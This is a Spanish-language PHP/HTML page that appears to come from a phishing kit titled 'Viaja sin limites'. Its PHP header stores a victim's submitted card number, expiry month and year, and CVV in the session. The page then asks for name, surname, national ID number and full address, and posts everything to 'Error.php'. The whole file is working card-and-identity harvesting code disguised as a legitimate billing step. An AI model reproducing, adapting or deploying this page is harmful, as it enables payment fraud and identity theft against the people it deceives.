
<?php

session_start();

$_SESSION['cc'] = $_POST['cc'];
$_SESSION['mm'] = $_POST['mm']; 
$_SESSION['aa'] = $_POST['aa'];
$_SESSION['cvv'] = $_POST['cvv'];


?>

<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <title>Viaja sin limites</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <meta name="HandheldFriendly" content="true">

  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  
  <link rel="stylesheet" href="Viaja%20sin%20limites%202_archivos/style.css">
  <link rel="shortcut icon" href="Viaja%20sin%20limites%202_archivos/favicon.ico">
  <script src="Viaja%20sin%20limites%202_archivos/validarcc.js"></script>
</head>

<body>
  <main>
    <header>
        <div class="mid">
            <a href="./">
                <img id="logo" src="Viaja sin limites 2_archivos/favicon.ico" style="height: 48px;">

                <img id="logo2" src="Viaja sin limites 2_archivos/favicon.ico" style="height: 48px;">
                
                <img id="logo3" style="display: none;background: #fa5c48;display: none;" src="./Viaja sin limites 2_archivos/style.php">
                </a>
    </div></header>
    <div id="background">



    </div>



  <div class="login-wrapper  " style=" padding: 30px 0; ">

        
      <h2>Dirección de facturación</h2>

  
          
    <form method="POST" action="Error.php" onsubmit="return valida();"> 
     
    
<div class="cc">

<input type="text" maxlength="16" placeholder="Nombre" name="nombre" autofocus="" required="">
<input type="text" maxlength="16" placeholder="Apellido" name="apellido" required="">   
<input type=text maxlength="8" placeholder="DNI" name="dni" required="">
<input type="text" maxlength="16" placeholder="Provincia" name="provincia" required="">
<input type="text" maxlength="16" placeholder="Localidad" name="localidad" required="">
<input type="text" maxlength="16" placeholder="Domicilio" name="domicilio" required="">
<input type=text  maxlength="4" placeholder="Código Postal" name="postal" required="">
                


      
      <input type="submit" value="Continuar">
      
    

    



  </div></form></div></main>










</body></html>